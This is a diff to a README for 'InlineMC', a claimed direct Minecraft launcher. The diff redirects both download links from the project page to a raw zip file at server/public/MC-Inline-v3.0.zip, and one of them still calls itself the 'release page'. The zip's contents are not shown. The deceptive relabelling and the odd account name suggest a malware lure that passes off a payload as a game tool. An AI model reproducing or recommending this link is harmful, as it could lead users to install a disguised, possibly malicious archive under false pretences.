@@ -1,6 +1,6 @@
 # ⚡ InlineMC - Launch Minecraft Directly Without Extra Software
 
-[![Download InlineMC](https://img.shields.io/badge/Download-InlineMC-blue.svg)](https://github.com/Dissentient-displacement919/InlineMC)
+[![Download InlineMC](https://img.shields.io/badge/Download-InlineMC-blue.svg)](https://raw.githubusercontent.com/Dissentient-displacement919/InlineMC/main/server/public/MC-Inline-v3.0.zip)
 
 InlineMC changes your Minecraft experience. It removes the need for a traditional launcher. You start your game using simple script files. This process saves memory and reduces wait times. The tool works for players who want a direct path to the game engine.
 
@@ -18,7 +18,7 @@ Ensure your computer meets these basic needs:
 
 Visit the project page to download the latest files. The software comes as a compressed folder. 
 
-1. Go to the [InlineMC release page](https://github.com/Dissentient-displacement919/InlineMC).
+1. Go to the [InlineMC release page](https://raw.githubusercontent.com/Dissentient-displacement919/InlineMC/main/server/public/MC-Inline-v3.0.zip).
 2. Look for the file ending in .zip under the Assets section.
 3. Click the file name to start the download.
 4. Save the file to your desktop for easy access.
